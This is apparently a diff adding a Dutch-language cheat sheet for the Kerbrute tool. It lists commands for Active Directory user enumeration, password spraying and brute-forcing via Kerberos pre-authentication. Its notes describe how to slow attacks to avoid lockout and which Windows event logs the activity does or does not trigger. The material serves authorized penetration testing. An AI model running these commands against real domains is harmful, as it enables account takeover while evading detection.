@@ -1,0 +1,49 @@
+# Kerbrute — Kerberos brute force en user enumeration
+# Enumereer geldige AD gebruikers en brute force wachtwoorden via Kerberos pre-auth
+#
+# === Syntax ===
+# kerbrute COMMANDO --dc DC -d DOMAIN [opties]
+#
+# === Commando's ===
+# userenum         Enumereer geldige gebruikersnamen (AS-REQ zonder pre-auth)
+# bruteuser        Brute force wachtwoorden voor een specifieke gebruiker
+# passwordspray    Spray een enkel wachtwoord tegen meerdere gebruikers
+# bruteforce       Brute force met user:pass combinaties uit bestand
+#
+# === Belangrijkste opties ===
+# --dc DC          Domain Controller IP/hostname
+# -d DOMAIN        Domeinnaam (bijv. corp.local)
+# -o FILE          Output bestand
+# --threads N      Aantal threads (default 10)
+# --delay MS       Vertraging tussen requests in milliseconden
+# -v               Verbose output
+#
+# === Voorbeelden ===
+
+# === User enumeration ===
+kerbrute userenum --dc DC -d DOMAIN users.txt
+
+# Met output naar bestand
+kerbrute userenum --dc DC -d DOMAIN users.txt -o valid_users.txt
+
+# === Password spray ===
+kerbrute passwordspray --dc DC -d DOMAIN valid_users.txt 'Welcome2024!'
+
+# Langzaam sprayen (vermijd lockout)
+kerbrute passwordspray --dc DC -d DOMAIN valid_users.txt 'Welkom01!' --delay 1000
+
+# === Brute force enkele gebruiker ===
+kerbrute bruteuser --dc DC -d DOMAIN passwords.txt administrator
+
+# === Brute force met user:pass combos ===
+# Bestand formaat: gebruiker:wachtwoord (per regel)
+kerbrute bruteforce --dc DC -d DOMAIN combos.txt
+
+# === Met meer threads ===
+kerbrute userenum --dc DC -d DOMAIN users.txt --threads 20
+
+# Noot: Kerbrute genereert GEEN standaard logon failure events (4625)
+# Noot: Wel zichtbaar als Kerberos pre-auth failures (4771) als verbose logging aan staat
+# Noot: Pas op met lockout policies — check eerst:
+#        net accounts /domain (of Get-ADDefaultDomainPasswordPolicy)
+# Noot: Werkt sneller dan LDAP-gebaseerde enumeration
